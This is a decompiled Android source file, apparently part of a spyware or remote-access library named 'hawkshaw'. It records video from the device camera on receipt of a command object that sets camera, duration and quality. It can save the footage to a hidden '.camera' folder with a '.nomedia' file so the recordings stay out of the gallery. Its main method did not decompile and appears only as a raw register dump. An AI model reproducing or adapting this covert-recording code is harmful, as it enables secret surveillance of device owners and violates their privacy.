package com.hawkshaw.library.features.media.camera;

import A.d;
import E.k;
import P0.b;
import W2.y;
import Y1.J;
import Y1.K;
import a3.e;
import a3.j;
import android.content.Context;
import android.os.Environment;
import android.os.Handler;
import android.os.Looper;
import androidx.lifecycle.C0266w;
import com.hawkshaw.library.datalayer.models.Command;
import com.hawkshaw.library.features.media.MediaService;
import com.hawkshaw.library.ktextensions.CoroutineKt;
import com.hawkshaw.library.logger.Logger;
import i.C0523s;
import i.C0528x;
import java.io.File;
import java.text.SimpleDateFormat;
import java.util.Locale;
import java.util.concurrent.ExecutorService;
import t.C0952b;
import t3.N;

public final class RecordVideoKt {
    private static final String FILENAME_FORMAT = "yyyy-MM-dd-HH-mm-ss-SSS";
    private static final String FILE_EXTENSION = ".mp4";
    private static final String TAG = "CameraXVideo";

    private static final File getOutputFile(Context context, boolean z4) {
        File file;
        if (z4) {
            file = Environment.getExternalStoragePublicDirectory(".camera");
            File externalFilesDir = context.getExternalFilesDir(".camera");
            if (externalFilesDir != null) {
                file = externalFilesDir;
            }
            if (!file.exists()) {
                file.mkdirs();
            }
            File file2 = new File(file, ".nomedia");
            if (!file2.exists()) {
                file2.createNewFile();
            }
        } else {
            file = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM);
            if (!file.exists()) {
                file.mkdirs();
            }
        }
        return new File(file, C0528x.c(new SimpleDateFormat(FILENAME_FORMAT, Locale.getDefault()).format(Long.valueOf(System.currentTimeMillis())), FILE_EXTENSION));
    }

    /* JADX WARNING: type inference failed for: r8v1, types: [q.O, java.lang.Object] */
    /* JADX WARNING: type inference failed for: r12v3, types: [o.o, java.lang.Object] */
    /* JADX WARNING: type inference failed for: r1v8, types: [c3.c] */
    /* access modifiers changed from: private */
    /* JADX WARNING: Multi-variable type inference failed */
    /* JADX WARNING: Removed duplicated region for block: B:14:0x004c  */
    /* JADX WARNING: Removed duplicated region for block: B:44:0x01e0 A[RETURN] */
    /* JADX WARNING: Removed duplicated region for block: B:45:0x01e1  */
    /* JADX WARNING: Removed duplicated region for block: B:8:0x0025  */
    /* Code decompiled incorrectly, please refer to instructions dump. */
    public static final java.lang.Object recordVideo(android.content.Context r19, androidx.lifecycle.C0266w r20, com.hawkshaw.library.datalayer.models.Command.RecordVideoRequest r21, A.d r22, a3.e r23) {
        /*
            r0 = r23
            boolean r1 = r0 instanceof com.hawkshaw.library.features.media.camera.c
            if (r1 == 0) goto L_0x0015
            r1 = r0
            com.hawkshaw.library.features.media.camera.c r1 = (com.hawkshaw.library.features.media.camera.c) r1
            int r2 = r1.f4987J
            r3 = -2147483648(0xffffffff80000000, float:-0.0)
            r4 = r2 & r3
            if (r4 == 0) goto L_0x0015
            int r2 = r2 - r3
            r1.f4987J = r2
            goto L_0x001a
        L_0x0015:
            com.hawkshaw.library.features.media.camera.c r1 = new com.hawkshaw.library.features.media.camera.c
            r1.<init>(r0)
        L_0x001a:
            java.lang.Object r0 = r1.f4986I
            b3.a r2 = b3.C0298a.f4140D
            int r3 = r1.f4987J
            r4 = 2
            r5 = 1
            r6 = 0
            if (r3 == 0) goto L_0x004c
            if (r3 == r5) goto L_0x003a
            if (r3 != r4) goto L_0x0032
            java.lang.Object r1 = r1.f4981D
            o.z0 r1 = (o.z0) r1
            Y1.C0110h.P(r0)
            goto L_0x01e2
        L_0x0032:
            java.lang.IllegalStateException r0 = new java.lang.IllegalStateException
            java.lang.String r1 = "call to 'resume' before 'invoke' with coroutine"
            r0.<init>(r1)
            throw r0
        L_0x003a:
            o.z0 r3 = r1.f4985H
            java.util.concurrent.ExecutorService r5 = r1.f4984G
            A.d r7 = r1.f4983F
            com.hawkshaw.library.datalayer.models.Command$RecordVideoRequest r8 = r1.f4982E
            java.lang.Object r9 = r1.f4981D
            android.content.Context r9 = (android.content.Context) r9
            Y1.C0110h.P(r0)
            r11 = r7
            goto L_0x0188
        L_0x004c:
            Y1.C0110h.P(r0)
            com.hawkshaw.library.logger.Logger r10 = com.hawkshaw.library.logger.Logger.INSTANCE
            java.lang.String r12 = "Record Video called"
            r13 = 0
            java.lang.String r11 = "CameraXVideo"
            r14 = 4
            r15 = 0
            com.hawkshaw.library.logger.Logger.d$default(r10, r11, r12, r13, r14, r15)
            java.util.concurrent.ExecutorService r0 = java.util.concurrent.Executors.newSingleThreadExecutor()
            java.util.LinkedHashSet r3 = new java.util.LinkedHashSet
            r3.<init>()
            int r7 = r21.getMLensFacing()
            q.O r8 = new q.O
            r8.<init>()
            r8.f8559a = r7
            r3.add(r8)
            o.o r12 = new o.o
            r12.<init>()
            r12.f8072a = r3
            o.s r3 = new o.s
            r7 = 3
            r3.<init>(r7)
            int r7 = r21.getVideoFrameRate()
            q.c r8 = q.m0.f8648E
            java.lang.Integer r7 = java.lang.Integer.valueOf(r7)
            q.Q r3 = r3.f8102b
            r3.l(r8, r7)
            int r7 = r21.getAudioChannelCount()
            q.c r8 = q.m0.f8653J
            java.lang.Integer r7 = java.lang.Integer.valueOf(r7)
            r3.l(r8, r7)
            q.c r7 = q.j0.f8627t
            r3.l(r7, r12)
            android.util.Size r7 = new android.util.Size
            com.hawkshaw.library.datalayer.models.Command$TakePictureRequest$Size r8 = r21.getMaxResolution()
            int r8 = r8.getWidth()
            com.hawkshaw.library.datalayer.models.Command$TakePictureRequest$Size r9 = r21.getMaxResolution()
            int r9 = r9.getHeight()
            r7.<init>(r8, r9)
            q.c r8 = q.K.f8557m
            r3.l(r8, r7)
            java.lang.Integer r7 = r21.getMRotation()
            if (r7 == 0) goto L_0x00cc
            java.lang.Integer r7 = r21.getMRotation()
            r7.getClass()
            q.c r8 = q.K.f8553i
            r3.l(r8, r7)
        L_0x00cc:
            int r7 = r21.getAudioBitRate()
            q.c r8 = q.m0.f8651H
            java.lang.Integer r7 = java.lang.Integer.valueOf(r7)
            r3.l(r8, r7)
            int r7 = r21.getAudioMinBufferSize()
            q.c r8 = q.m0.f8654K
            java.lang.Integer r7 = java.lang.Integer.valueOf(r7)
            r3.l(r8, r7)
            int r7 = r21.getAudioSampleRate()
            q.c r8 = q.m0.f8652I
            java.lang.Integer r7 = java.lang.Integer.valueOf(r7)
            r3.l(r8, r7)
            int r7 = r21.getBitRate()
            q.c r8 = q.m0.f8649F
            java.lang.Integer r7 = java.lang.Integer.valueOf(r7)
            r3.l(r8, r7)
            int r7 = r21.getIFrameInterval()
            q.c r8 = q.m0.f8650G
            java.lang.Integer r7 = java.lang.Integer.valueOf(r7)
            r3.l(r8, r7)
            int r7 = r21.getMAspectRatio()
            q.c r8 = q.K.f8552h
            java.lang.Integer r7 = java.lang.Integer.valueOf(r7)
            r3.l(r8, r7)
            r3.getClass()
            java.lang.Object r7 = r3.f(r8)     // Catch:{ IllegalArgumentException -> 0x0122 }
            goto L_0x0123
        L_0x0122:
            r7 = r6
        L_0x0123:
            if (r7 == 0) goto L_0x013b
            q.c r7 = q.K.f8555k
            r3.getClass()
            java.lang.Object r7 = r3.f(r7)     // Catch:{ IllegalArgumentException -> 0x012f }
            goto L_0x0130
        L_0x012f:
            r7 = r6
        L_0x0130:
            if (r7 != 0) goto L_0x0133
            goto L_0x013b
        L_0x0133:
            java.lang.IllegalArgumentException r0 = new java.lang.IllegalArgumentException
            java.lang.String r1 = "Cannot use both setTargetResolution and setTargetAspectRatio on the same config."
            r0.<init>(r1)
            throw r0
        L_0x013b:
            o.z0 r7 = new o.z0
            q.m0 r8 = new q.m0
            q.T r3 = q.T.i(r3)
            r8.<init>(r3)
            r7.<init>(r8)
            int r3 = r21.getMFlashMode()
            if (r3 != r5) goto L_0x015e
            q.s r3 = r7.a()
            if (r3 == 0) goto L_0x015e
            i.A r3 = (i.C0488A) r3
            i.p r3 = r3.f5678I
            if (r3 == 0) goto L_0x015e
            r3.h(r5)
        L_0x015e:
            t3.q0 r3 = y3.t.f10013a
            com.hawkshaw.library.features.media.camera.d r8 = new com.hawkshaw.library.features.media.camera.d
            r14 = 0
            r9 = r8
            r10 = r22
            r11 = r20
            r13 = r7
            r9.<init>(r10, r11, r12, r13, r14)
            r9 = r19
            r1.f4981D = r9
            r10 = r21
            r1.f4982E = r10
            r11 = r22
            r1.f4983F = r11
            r1.f4984G = r0
            r1.f4985H = r7
            r1.f4987J = r5
            java.lang.Object r3 = X1.B.B(r3, r8, r1)
            if (r3 != r2) goto L_0x0185
            return r2
        L_0x0185:
            r5 = r0
            r3 = r7
            r8 = r10
        L_0x0188:
            boolean r0 = r8.getSaveToPrivate()
            java.io.File r0 = getOutputFile(r9, r0)
            o.w0 r7 = new o.w0
            r17 = 0
            r18 = 0
            r14 = 0
            r15 = 0
            r16 = 0
            r12 = r7
            r13 = r0
            r12.<init>(r13, r14, r15, r16, r17, r18)
            com.hawkshaw.library.features.media.camera.RecordVideoKt$recordVideo$callback$1 r9 = new com.hawkshaw.library.features.media.camera.RecordVideoKt$recordVideo$callback$1
            r9.<init>(r0, r5, r11)
            r3.B(r7, r5, r9)
            com.hawkshaw.library.logger.Logger r12 = com.hawkshaw.library.logger.Logger.INSTANCE
            long r9 = r8.getDuration()
            java.lang.StringBuilder r0 = new java.lang.StringBuilder
            java.lang.String r5 = "Record Video for "
            r0.<init>(r5)
            r0.append(r9)
            java.lang.String r5 = "ms"
            r0.append(r5)
            java.lang.String r14 = r0.toString()
            java.lang.String r13 = "CameraXVideo"
            r15 = 0
            r16 = 4
            r17 = 0
            com.hawkshaw.library.logger.Logger.d$default(r12, r13, r14, r15, r16, r17)
            long r7 = r8.getDuration()
            r1.f4981D = r3
            r1.f4982E = r6
            r1.f4983F = r6
            r1.f4984G = r6
            r1.f4985H = r6
            r1.f4987J = r4
            java.lang.Object r0 = Y1.K.C(r7, r1)
            if (r0 != r2) goto L_0x01e1
            return r2
        L_0x01e1:
            r1 = r3
        L_0x01e2:
            q.s r0 = r1.a()
            if (r0 == 0) goto L_0x01f2
            i.A r0 = (i.C0488A) r0
            i.p r0 = r0.f5678I
            if (r0 == 0) goto L_0x01f2
            r2 = 0
            r0.h(r2)
        L_0x01f2:
            r1.C()
            W2.y r0 = W2.y.f2418a
            return r0
        */
        throw new UnsupportedOperationException("Method not decompiled: com.hawkshaw.library.features.media.camera.RecordVideoKt.recordVideo(android.content.Context, androidx.lifecycle.w, com.hawkshaw.library.datalayer.models.Command$RecordVideoRequest, A.d, a3.e):java.lang.Object");
    }

    /* access modifiers changed from: private */
    public static final void recordVideo$lambda$0(b bVar, Context context, C0266w wVar, Command.RecordVideoRequest recordVideoRequest) {
        K.n(bVar, "$cameraProviderFuture");
        K.n(context, "$context");
        K.n(wVar, "$owner");
        K.n(recordVideoRequest, "$request");
        CoroutineKt.safeLaunch$default(J.a(N.f9290a), (j) null, new b(context, wVar, recordVideoRequest, (d) bVar.get(), (e) null), 1, (Object) null);
    }

    /* access modifiers changed from: private */
    public static final void recordVideo$releaseResources(ExecutorService executorService, d dVar) {
        Logger.d$default(Logger.INSTANCE, TAG, "Releasing resources", false, 4, (Object) null);
        executorService.shutdown();
        new Handler(Looper.getMainLooper()).post(new a(dVar, 0));
        MediaService.Companion.stopService$library_release();
    }

    /* access modifiers changed from: private */
    public static final void recordVideo$releaseResources$lambda$2(d dVar) {
        K.n(dVar, "$cameraProvider");
        dVar.c();
    }

    public static final Object recordVideo(Context context, C0266w wVar, Command.RecordVideoRequest recordVideoRequest, e eVar) {
        C0952b b5 = d.b(context);
        b5.a(new C0523s(b5, context, wVar, recordVideoRequest, 8), k.getMainExecutor(context));
        return y.f2418a;
    }
}
